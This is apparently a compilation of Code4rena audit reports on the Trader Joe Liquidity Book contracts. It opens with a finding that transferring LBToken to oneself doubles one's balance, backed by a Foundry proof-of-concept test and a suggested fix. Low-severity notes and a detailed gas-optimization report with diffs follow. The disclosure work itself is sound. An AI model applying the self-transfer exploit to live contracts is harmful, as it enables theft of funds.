[here](https://github.com/code-423n4/2022-10-traderjoe-findings/blob/main/data/IllIllI-G.md)
# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192   # Vulnerability details  ## Impact Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:  ```solidity File: LBToken.sol 176:     function _transfer( 177:         address _from, 178:         address _to, 179:         uint256 _id, 180:         uint256 _amount 181:     ) internal virtual { 182:         uint256 _fromBalance = _balances[_id][_from]; ... 187:         uint256 _toBalance = _balances[_id][_to]; 188:  189:         unchecked { 190:             _balances[_id][_from] = _fromBalance - _amount; 191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt 192:         } .. 196:     } ```  Furthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :  ```solidity File: LBToken.sol 32:     modifier checkApproval(address _from, address _spender) { 33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender); 34:         _; 35:     } ... 131:     function safeTransferFrom( ... 136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) { ... 269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) { 270:         return _owner == _spender || _spenderApprovals[_owner][_spender]; 271:     } ```  ## Proof of Concept Add the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):  ```solidity     function testSafeTransferFromOneself() public {         uint256 amountIn = 1e18;          (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);          uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);          assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding          pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself         uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance         assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one         assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding     } ```  As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.  ## Recommended Mitigation Steps - Add checks to make sure that `_from != _to` because that shouldn't be useful anyway - Prefer the following:  ```solidity File: LBToken.sol 189:         unchecked { 190:             _balances[_id][_from] -= _amount; 191:             _balances[_id][_to] += _amount; 192:         } ```
## Unify bit access to variables  Packed variables are sometimes accessed using `Decoder.decode` and sometimes accessed by directly applying a mask and a shift.  ## `binStep` size should probably be 16 in `LBPairInformation` struct  The `createLBPair` function present in the factory takes the `binStep` argument as a `uint16`, which aligns also with packed size in the fee parameters and other uses.  However, the size for the `binStep` in the `LBPairInformation` is `uint24`.  ## `burn` function in `LBPair` should validate array lengths  The `burn` function receives two arrays that are iterated simultaneously and should have the same length. Consider adding a validation to ensure their lengths match.
# Gas Optimizations Report  ## [G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol  `LBToken` [enumerates token/bin IDs owned by users in a pair](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L26-L27). The enumeration is only exposed through [two external functions](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L96-L109), which are just for convenience for off-chain usage, and not necessary for the functionality of the protocol. Removing enumeration will save tremendous amounts of gas during essential operations of adding and removing liquidity.  ### Impact of enumeration  OpenZeppelins EnumerableSet roughly costs 50,000 gas when adding and removing elements from the set. Even for a small price range, adding liquidity in Liquidity Book requires minting tokens from many bins. For example, currently [the testnet user interface](https://gadgetzan.traderjoexyz.com/poolv2/0xb6076c93701d6a07266c31066b298aec6dd65c2d/0xab231a5744c8e6c45481754928ccffffd4aa0732/1) mints 31 tokens when adding liquidity in a normal distribution shape. This operation [roughly costs 4,000,000 gas](https://testnet.snowtrace.io/tx/0x88812398557021281e52eacf38f5064a344d4bee0290e96b37ffc2bea6102042), and removal costs about half of that. Given a volatile market, we can expect users to remove and re-add liquidity pretty often. This coupled operation costs around 6,000,000 gas if you have the minimum amount of bins in a normal distribution (31 as allowed by the current UI), which will be about 0.15 AVAX (25 nAVAX base fee). That would be \$2.25 in current AVAX price (\$15). And that would be \$15 when AVAX is \$100, and \$120 when AVAX is $100 and network is heavily used (200 nAVAX base fee). Given that the protocol needs `swap_fee_earned / gas_fee_to_move_liquidity` to be greater than `1` to incentivize users to chase the price to concentrate the liquidity, the mint & burn fees must be as little as possible to allow non-whales to be also able to profitably move around their liquidity. Removing the enumeration can nearly halve that cost, making the protocol enticing to more users.  ### [Non-]reasons to enumerate  Enumeration allows user interfaces to easily see which bins a user is in directly from the blockchain. With the absence of enumeration, Trader Joe will need to index this information either using in-house tools or using something like The Graph. Trader Joe team is already familiar with indexing through their NFT marketplace Joepegs, therefore it seems practical for them to go off-chain indexing route.  Enumeration allows a decentralized way to pull the information from the blockchain. We have to admit that not enumerating would be in detriment to user interfaces that would have wanted to integrate Liquidity Book by using decentralized methods only. However, that is a very small percent of builders that hold such principles. The rest of the builders can also use off-chain indexing.  There is also the end user who might want to learn which bins they are in conveniently using decentralized methods. They can still do this in decentralized manner by checking all the bins, given the bin IDs are determined by step and price and have a range of few thousand (bin step = 100) to few millions (bin step = 1). Admittedly this is not very convenient, but it is doable.  ### Diff to remove enumeration  The following diff removes the enumeration from the code and tests.  ```diff diff --git a/src/LBToken.sol b/src/LBToken.sol index 47aa528..6cb1dbc 100644 --- a/src/LBToken.sol +++ b/src/LBToken.sol @@ -23,9 +23,6 @@ contract LBToken is ILBToken {      /// @dev Mapping from token id to total supplies      mapping(uint256 => uint256) private _totalSupplies;  -    /// @dev  Mapping from account to set of ids, where user currently have a non-zero balance -    mapping(address => EnumerableSet.UintSet) private _userIds; -      string private constant _name = "Liquidity Book Token";      string private constant _symbol = "LBT";  @@ -93,21 +90,6 @@ contract LBToken is ILBToken {          }      }  -    /// @notice Returns the type id at index `_index` where `account` has a non-zero balance -    /// @param _account The address of the account -    /// @param _index The position index -    /// @return The `account` non-zero position at index `_index` -    function userPositionAtIndex(address _account, uint256 _index) public view virtual override returns (uint256) { -        return _userIds[_account].at(_index); -    } - -    /// @notice Returns the number of non-zero balances of `account` -    /// @param _account The address of the account -    /// @return The number of non-zero balances of `account` -    function userPositionNumber(address _account) public view virtual override returns (uint256) { -        return _userIds[_account].length(); -    } -      /// @notice Returns true if `spender` is approved to transfer `_account`'s tokens      /// @param _owner The address of the owner      /// @param _spender The address of the spender @@ -190,9 +172,6 @@ contract LBToken is ILBToken {              _balances[_id][_from] = _fromBalance - _amount;              _balances[_id][_to] = _toBalance + _amount;          } - -        _remove(_from, _id, _fromBalance, _amount); -        _add(_to, _id, _toBalance, _amount);      }       /// @dev Creates `_amount` tokens of type `_id`, and assigns them to `_account` @@ -215,8 +194,6 @@ contract LBToken is ILBToken {              _balances[_id][_account] = _accountBalance + _amount;          }  -        _add(_account, _id, _accountBalance, _amount); -          emit TransferSingle(msg.sender, address(0), _account, _id, _amount);      }  @@ -241,8 +218,6 @@ contract LBToken is ILBToken {              _totalSupplies[_id] -= _amount;          }  -        _remove(_account, _id, _accountBalance, _amount); -          emit TransferSingle(msg.sender, _account, address(0), _id, _amount);      }  @@ -270,38 +245,6 @@ contract LBToken is ILBToken {          return _owner == _spender || _spenderApprovals[_owner][_spender];      }  -    /// @notice Internal function to add an id to an user's set -    /// @param _account The user's address -    /// @param _id The id of the token -    /// @param _accountBalance The user's balance -    /// @param _amount The amount of tokens -    function _add( -        address _account, -        uint256 _id, -        uint256 _accountBalance, -        uint256 _amount -    ) internal { -        if (_accountBalance == 0 && _amount != 0) { -            _userIds[_account].add(_id); -        } -    } - -    /// @notice Internal function to remove an id from an user's set -    /// @param _account The user's address -    /// @param _id The id of the token -    /// @param _accountBalance The user's balance -    /// @param _amount The amount of tokens -    function _remove( -        address _account, -        uint256 _id, -        uint256 _accountBalance, -        uint256 _amount -    ) internal { -        if (_accountBalance == _amount && _amount != 0) { -            _userIds[_account].remove(_id); -        } -    } -      /// @notice Hook that is called before any token transfer. This includes minting      /// and burning.      /// diff --git a/src/interfaces/ILBToken.sol b/src/interfaces/ILBToken.sol index 36b1fb7..49c6243 100644 --- a/src/interfaces/ILBToken.sol +++ b/src/interfaces/ILBToken.sol @@ -29,10 +29,6 @@ interface ILBToken {          view          returns (uint256[] memory batchBalances);  -    function userPositionAtIndex(address account, uint256 index) external view returns (uint256); - -    function userPositionNumber(address account) external view returns (uint256); -      function totalSupply(uint256 id) external view returns (uint256);       function isApprovedForAll(address owner, address spender) external view returns (bool); diff --git a/test/LBRouter.t.sol b/test/LBRouter.t.sol index 4f2aa33..a38d9fb 100644 --- a/test/LBRouter.t.sol +++ b/test/LBRouter.t.sol @@ -410,10 +410,8 @@ contract LiquidityBinRouterTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);  diff --git a/test/LBToken.t.sol b/test/LBToken.t.sol index d263153..b5aa7cc 100644 --- a/test/LBToken.t.sol +++ b/test/LBToken.t.sol @@ -34,10 +34,8 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);          vm.expectEmit(true, true, true, true); @@ -67,10 +65,8 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);          vm.expectEmit(true, true, true, true); @@ -99,7 +95,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -114,7 +109,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -130,7 +124,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -163,7 +156,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -195,7 +187,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount - 1);          for (uint256 i; i < binAmount - 1; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -244,7 +235,6 @@ contract LiquidityBinTokenTest is TestHelper {          (_ids, , , ) = addLiquidity(amountIn, _startId, binAmount, _gap);          uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }          batchBalances = pair.balanceOfBatch(accounts, _ids); ```  ### Gas savings  Below is the output of `forge snapshot --diff | tail -65` converted to CSV. Especially see `testInternalBurn` and `testInternalMint` functions showing greater than 50% savings.  ```csv Test Function,Gas Cost Difference,Percent Difference testSetLBPairImplementation(),-460002,-2.742% testConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24),-153429,-3.014% testGetSwapInOverflowReverts(),-67031,-9.004% testGetSwapOutWithMultipleChoices(),-427507,-10.436% testOracleSampleFromWith2Samples(),-67031,-12.911% testSwapYtoXSingleBinFromGetSwapIn(),-66966,-13.118% testSwapYtoXSingleBinFromGetSwapOut(),-67031,-13.449% testSwapXtoYSingleBinFromGetSwapOut(),-67031,-13.450% testSwapXtoYSingleBinFromGetSwapIn(),-67031,-13.501% testOracleSampleFromEdgeCases(),-67009,-13.970% testFuzzingAddLiquidity(uint256),-157150,-15.139% testDistributionOverflowReverts(),-134018,-15.454% testOracleSampleFromWith100Samples(),-4487757,-17.917% testClaimFeesComplex(uint256,uint256),-247423,-18.921% testForIdSlippageCaughtReverts(),-427485,-19.194% testClaimProtocolFees(),-247401,-19.862% testClaimFeesY(),-247335,-20.163% testClaimFeesX(),-247335,-20.163% testFeesOnTokenTransfer(),-284146,-20.361% testSwapWithDifferentBinSteps(),-427529,-20.375% testForAmountSlippageCaughtReverts(),-473364,-21.279% testGetSwapInWrongAmountsReverts(),-427485,-21.326% testFlawedCompositionFactor(),-359365,-21.362% testGetSwapInMoreBins(),-427031,-21.706% testInsufficientLiquidityMinted(),-359321,-21.806% testGetSwapOutOnComplexRoute(),-427464,-22.719% testGetSwapInOnComplexRoute(),-427507,-22.968% testOracleSampleFromWith100SamplesNotAllInitialized(),-4484457,-22.991% testAddLiquidityIgnored(),-428376,-23.297% testGetSwapInWithMultipleChoices(),-427507,-23.756% testSwapYtoXDistantBinsFromGetSwapOut(),-427421,-23.911% testSwapYtoXDistantBinsFromGetSwapIn(),-427421,-23.933% testBalanceOfBatch(),-256383,-24.074% testFeeOnActiveBinReverse(),-213936,-24.331% testFeeOnActiveBin(),-213936,-24.331% testSwapXtoYDistantBinsFromGetSwapOut(),-427486,-24.412% testSafeBatchTransferNotApprovedReverts(),-256343,-24.420% testSwapXtoYDistantBinsFromGetSwapIn(),-427486,-24.425% testSafeTransferNotApprovedReverts(),-256376,-24.488% testFlashloan(),-427513,-24.826% testSwapXtoYConsecutiveBinFromGetSwapOut(),-427486,-25.050% testSwapXtoYConsecutiveBinFromGetSwapIn(),-427486,-25.064% testSwapYtoXConsecutiveBinFromGetSwapOut(),-427486,-25.089% testSwapYtoXConsecutiveBinFromGetSwapIn(),-427486,-25.104% testBurnLiquidity(),-477535,-25.129% testSafeTransferFrom(),-295891,-25.295% testGetSwapOutOnV2Pair(),-427507,-26.931% testGetSwapInOnV2Pair(),-427507,-26.953% testSweepLBToken(),-489987,-27.188% testModifierCheckLength(),-535964,-28.163% testSafeTransferFromReverts(),-537662,-28.222% testForceDecay(),-2319546,-28.916% testSafeBatchTransferFromReverts(),-606907,-29.824% testAddLiquidityTaxToken(),-1076244,-29.978% testTLowerThanTimestamp(),-2319913,-30.143% testRemoveLiquidityReverseOrder(),-709108,-33.958% testAddLiquidityNoSlippage(),-709107,-33.960% testAddLiquidityAVAXReversed(),-1608674,-35.141% testAddLiquidityAVAX(),-1758599,-35.555% testSafeBatchTransferFrom(),-570685,-36.100% testRemoveLiquiditySlippageReverts(),-2670446,-42.380% testInternalBurn(uint256,uint256),-67156,-53.633% testInternalMint(uint256),-67231,-55.603% testInternalExcessiveBurnAmountReverts(uint128,uint128),-66987,-56.306% Overall,-39447398,-1550.248% ```  Note that there are other instances of enumeration in the protocol. However, they only cost gas in admin functions or during pair creation. Also they enumerate addresses. Therefore I believe them to be justified, hence I only focused on enumeration of this core protocol functionality (adding and removing liquidity). I think it is essential to remove this enumeration to improve the efficiency of the protocol. Reducing gas cost during adding or removing liquidity is of utmost importance for the optimization of this protocol, as it will make it feasible to do bin operations at greater scale.  ## [G-02] Using Solidity version 0.8.17 will provide an overall gas optimization  Using at least `0.8.10` will save gas due to skipped `extcodesize` check if there is a return value. Currently the contracts are compiled using version `0.8.7` (Foundry default). It is easily changeable to `0.8.17` using the command `sed -i 's/0\.8\.7/^0.8.0/' test/*.sol && sed -i '4isolc = "0.8.17"' foundry.toml`. This will have the following total savings obtained by `forge snapshot --diff | tail -1`:  ```csv Test Function,Gas Cost Difference,Percent Difference Overall,-582995,-88.032% ```  ## [G-03] Ternary operation is cheaper than if-else statement  There are instances where a ternary operation can be used instead of if-else statement. In these cases, using ternary operation will save modest amounts of gas.  ```diff diff --git a/src/libraries/BitMath.sol b/src/libraries/BitMath.sol index d088fdf..29c4034 100644 --- a/src/libraries/BitMath.sol +++ b/src/libraries/BitMath.sol @@ -16,9 +16,7 @@ library BitMath {          uint8 _bit,          bool _rightSide      ) internal pure returns (uint256) { -        if (_rightSide) { -            return closestBitRight(_integer, _bit - 1); -        } else return closestBitLeft(_integer, _bit + 1); +        return _rightSide ? closestBitRight(_integer, _bit - 1) : closestBitLeft(_integer, _bit + 1);      }       /// @notice Returns the most (or least) significant bit of `_integer` @@ -26,9 +24,7 @@ library BitMath {      /// @param _isMostSignificant Whether we want the most (true) or the least (false) significant bit      /// @return The index of the most (or least) significant bit      function significantBit(uint256 _integer, bool _isMostSignificant) internal pure returns (uint8) { -        if (_isMostSignificant) { -            return mostSignificantBit(_integer); -        } else return leastSignificantBit(_integer); +        return _isMostSignificant ? mostSignificantBit(_integer) : leastSignificantBit(_integer);      }       /// @notice Returns the index of the closest bit on the right of x that is non null @@ -41,10 +37,8 @@ library BitMath {              uint256 _shift = 255 - bit;              x <<= _shift;  -            if (x == 0) return type(uint256).max; - -            // can't overflow as it's non-zero and we shifted it by `_shift` -            return mostSignificantBit(x) - _shift; +            // can't underflow as it's non-zero and we shifted it by `_shift` +            return (x == 0) ? type(uint256).max : mostSignificantBit(x) - _shift;          }      }  @@ -57,9 +51,7 @@ library BitMath {          unchecked {              x >>= bit;  -            if (x == 0) return type(uint256).max; - -            return leastSignificantBit(x) + bit; +            return (x == 0) ? type(uint256).max : leastSignificantBit(x) + bit;          }      } ```  Note that this optimization seems to be dependent on usage of a more recent Solidity version. The following gas savings are on version `0.8.17`.  ```csv Test Function,Gas Cost Difference,Percent Difference Overall,-13065,-0.200% ```  ## [G-04] Checking `msg.sender` to not be zero address is redundant  There is an instance where `msg.sender` is checked not to be zero address. This check is redundant as no private key is known for this address, hence there can be no transactions coming from the zero address. The following diff removes this redundant check.  ```diff diff --git a/src/libraries/PendingOwnable.sol b/src/libraries/PendingOwnable.sol index f745362..97fb524 100644 --- a/src/libraries/PendingOwnable.sol +++ b/src/libraries/PendingOwnable.sol @@ -33,7 +33,7 @@ contract PendingOwnable is IPendingOwnable {       /// @notice Throws if called by any account other than the pending owner.      modifier onlyPendingOwner() { -        if (msg.sender != _pendingOwner || msg.sender == address(0)) revert PendingOwnable__NotPendingOwner(); +        if (msg.sender != _pendingOwner) revert PendingOwnable__NotPendingOwner();          _;      }   ```  This will save tiny amounts of gas when `PendingOwnable.becomeOwner()` is called.  ## [G-05] An element is cached to memory after it is used  Caching a struct element locally should be done before using it to save gas. The following diff applies this optimization.  ```diff diff --git a/src/LBPair.sol b/src/LBPair.sol index 717270e..1d29c39 100644 --- a/src/LBPair.sol +++ b/src/LBPair.sol @@ -316,8 +316,8 @@ contract LBPair is LBToken, ReentrancyGuardUpgradeable, ILBPair {          if (_amountIn == 0) revert LBPair__InsufficientAmounts();           FeeHelper.FeeParameters memory _fp = _feeParameters; -        _fp.updateVariableFeeParameters(_pair.activeId);          uint256 _startId = _pair.activeId; +        _fp.updateVariableFeeParameters(_startId);           uint256 _amountOut;          // Performs the actual swap, bin per bin ```  This will save small amount of gas when swapping.  ```csv Test Function,Gas Cost Difference,Percent Difference testSwapExactTokensForTokensSinglePair(),-30,-0.009% ```  ## [G-06] Divisions by `2**n` can be replaced by right shift by `n`  There is an instance of division by `2`, which can be replaced by right shift by `1`. This simple bit operation is always cheaper than division. The following diff applies this optimization.  ```diff diff --git a/src/libraries/Oracle.sol b/src/libraries/Oracle.sol index 974bc9f..fd9ca64 100644 --- a/src/libraries/Oracle.sol +++ b/src/libraries/Oracle.sol @@ -159,7 +159,7 @@ library Oracle {          uint256 _sampleTimestamp;          while (_high >= _low) {              unchecked { -                _middle = (_low + _high) / 2; +                _middle = (_low + _high) >> 1;                  assembly {                      _id := addmod(_middle, _index, _activeSize)                  } ```  Gas savings are obtained by `forge snapshot --diff`.  ```csv Test Function,Gas Cost Difference,Percent Difference testOracleSampleFromWith2Samples(),-4,-0.001% testOracleSampleFromWith100SamplesNotAllInitialized(),-452,-0.002% testFuzzingAddLiquidity(uint256),30,0.003% testOracleSampleFromWith100Samples(),-1320,-0.005% Overall,-1746,-0.005% ```  ## [G-07] Runtime cost can be optimized in detriment of the deploy cost  There are two optimization to improve runtime cost. Although the following optimizations will increase the gas cost of new pair creation and certain admin functions, it will decrease runtime cost of core protocol functions (swap, add/remove liquidity). Given that a pair is created once, but thousands of operations are made on it, optimizing for runtime can save a lot of gas in the long term.  ### [G-07A] Storing `LBFactory._LBPairsInfo` info in both sorting order will save gas in runtime  When `LBFactory.createLBPair()` is called, the pair information can be stored in both sorting orders of its reserve tokens. This will allow skipping [`_sortTokens()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L607-L611), reducing the gas cost of [`_getLBPairInformation()`](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L593-L600).  ```diff diff --git a/src/LBFactory.sol b/src/LBFactory.sol index 32ee39c..7c66fbf 100644 --- a/src/LBFactory.sol +++ b/src/LBFactory.sol @@ -183,9 +183,7 @@ contract LBFactory is PendingOwnable, ILBFactory {          returns (LBPairInformation[] memory LBPairsAvailable)      {          unchecked { -            (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY); - -            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenA][_tokenB]; +            bytes32 _avLBPairBinSteps = _availableLBPairBinSteps[_tokenX][_tokenY];              uint256 _nbAvailable = _avLBPairBinSteps.decode(type(uint8).max, 248);                if (_nbAvailable > 0) { @@ -194,7 +192,7 @@ contract LBFactory is PendingOwnable, ILBFactory {                  uint256 _index;                  for (uint256 i = MIN_BIN_STEP; i <= MAX_BIN_STEP; ++i) {                      if (_avLBPairBinSteps.decode(1, i) == 1) { -                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][i]; +                        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][i];                            LBPairsAvailable[_index] = LBPairInformation({                              binStep: i.safe24(), @@ -273,6 +271,12 @@ contract LBFactory is PendingOwnable, ILBFactory {              createdByOwner: msg.sender == _owner,              ignoredForRouting: false          }); +        _LBPairsInfo[_tokenB][_tokenA][_binStep] = LBPairInformation({ +            binStep: _binStep, +            LBPair: _LBPair, +            createdByOwner: msg.sender == _owner, +            ignoredForRouting: false +        });            allLBPairs.push(_LBPair);   @@ -286,6 +290,7 @@ contract LBFactory is PendingOwnable, ILBFactory {                // Save the changes              _availableLBPairBinSteps[_tokenA][_tokenB] = _avLBPairBinSteps; +            _availableLBPairBinSteps[_tokenB][_tokenA] = _avLBPairBinSteps;          }            emit LBPairCreated(_tokenX, _tokenY, _binStep, _LBPair, allLBPairs.length - 1); @@ -315,14 +320,13 @@ contract LBFactory is PendingOwnable, ILBFactory {          uint256 _binStep,          bool _ignored      ) external override onlyOwner { -        (IERC20 _tokenA, IERC20 _tokenB) = _sortTokens(_tokenX, _tokenY); - -        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenA][_tokenB][_binStep]; +        LBPairInformation memory _LBPairInformation = _LBPairsInfo[_tokenX][_tokenY][_binStep];          if (address(_LBPairInformation.LBPair) == address(0)) revert LBFactory__AddressZero();            if (_LBPairInformation.ignoredForRouting == _ignored) revert LBFactory__LBPairIgnoredIsAlreadyInTheSameState();   -        _LBPairsInfo[_tokenA][_tokenB][_binStep].ignoredForRouting = _ignored; +        _LBPairsInfo[_tokenX][_tokenY][_binStep].ignoredForRouting = _ignored; +        _LBPairsInfo[_tokenY][_tokenX][_binStep].ignoredForRouting = _ignored;            emit LBPairIgnoredStateChanged(_LBPairInformation.LBPair, _ignored);      } @@ -595,7 +599,6 @@ contract LBFactory is PendingOwnable, ILBFactory {          IERC20 _tokenB,          uint256 _binStep      ) private view returns (LBPairInformation memory) { -        (_tokenA, _tokenB) = _sortTokens(_tokenA, _tokenB);          return _LBPairsInfo[_tokenA][_tokenB][_binStep];      }   ```  ### [G-07B] Using CREATE2 is cheaper than Clones  Using clone contracts requires extra proxy call, increasing the cost of all pair functions. Using CREATE2, although will increase cost of pair creation, will make all pair interactions cheaper.  ## [G-08] Making constant variables private will save gas during deployment  When constants are marked public, extra getter functions are created, increasing the deployment cost. Marking these functions private will decrease gas cost. One can still read these variables through the source code. If they need to be accessed by an external contract, a separate single getter function can be used to return all constants as a tuple. There [are four instances of public constants](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBFactory.sol#L25-L30).  ```solidity src/LBFactory.sol:25:    uint256 public constant override MAX_FEE = 0.1e18; // 10% src/LBFactory.sol:27:    uint256 public constant override MIN_BIN_STEP = 1; // 0.01% src/LBFactory.sol:28:    uint256 public constant override MAX_BIN_STEP = 100; // 1%, can't be greater than 247 for indexing reasons src/LBFactory.sol:30:    uint256 public constant override MAX_PROTOCOL_SHARE = 2_500; // 25% ```  ## [G-09] Using `bool`s for storage incurs overhead  *Credit: Description by [IllIllI000](https://gist.github.com/IllIllI000)*.  ```     // Booleans are more expensive than uint256 or any type that takes up a full     // word because each write operation emits an extra SLOAD to first read the     // slot's contents, replace the bits taken up by the boolean, and then write     // back. This is the compiler's defense against contract upgrades and     // pointer aliasing, and it cannot be disabled. ``` https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27 Use `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess ([**100 gas**](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from `false` to `true`, after having been `true` in the past.  There are 2 instances of this issue:  ```solidity src/LBFactory.sol-38-    /// @notice Whether the createLBPair function is unlocked and can be called by anyone (true) or only by owner (false) src/LBFactory.sol:39:    bool public override creationUnlocked; -- src/LBToken.sol-20-    /// @dev Mapping from account to spender approvals src/LBToken.sol:21:    mapping(address => mapping(address => bool)) private _spenderApprovals; ```  ## [G10] Functions guaranteed to revert when called by normal users can be marked `payable`  *Credit: Description by [IllIllI000](https://gist.github.com/IllIllI000)*.  If a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are `CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost  There are 14 instances of this:  ```solidity src/libraries/PendingOwnable.sol:59:    function setPendingOwner(address pendingOwner_) public override onlyOwner { src/libraries/PendingOwnable.sol:68:    function revokePendingOwner() public override onlyOwner { src/libraries/PendingOwnable.sol:84:    function renounceOwnership() public override onlyOwner { src/LBFactory.sol:215:    function setLBPairImplementation(address _LBPairImplementation) external override onlyOwner { src/LBFactory.sol:317:    ) external override onlyOwner { src/LBFactory.sol:350:    ) external override onlyOwner { src/LBFactory.sol:396:    function removePreset(uint16 _binStep) external override onlyOwner { src/LBFactory.sol:434:    ) external override onlyOwner { src/LBFactory.sol:468:    function setFeeRecipient(address _feeRecipient) external override onlyOwner { src/LBFactory.sol:474:    function setFlashLoanFee(uint256 _flashLoanFee) external override onlyOwner { src/LBFactory.sol:485:    function setFactoryLockedState(bool _locked) external override onlyOwner { src/LBFactory.sol:493:    function addQuoteAsset(IERC20 _quoteAsset) external override onlyOwner { src/LBFactory.sol:502:    function removeQuoteAsset(IERC20 _quoteAsset) external override onlyOwner { src/LBFactory.sol:520:    function forceDecay(ILBPair _LBPair) external override onlyOwner { ```
